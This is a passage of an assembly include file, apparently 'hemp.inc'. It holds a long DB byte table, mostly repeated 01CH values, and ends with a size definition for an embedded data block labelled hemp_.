DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,004H,004H,01BH,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,002H,004H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,004H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 002H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,002H,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,002H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H
script_size2		equ $-hemp_


------------------------------< hemp.inc >--------------------------------------




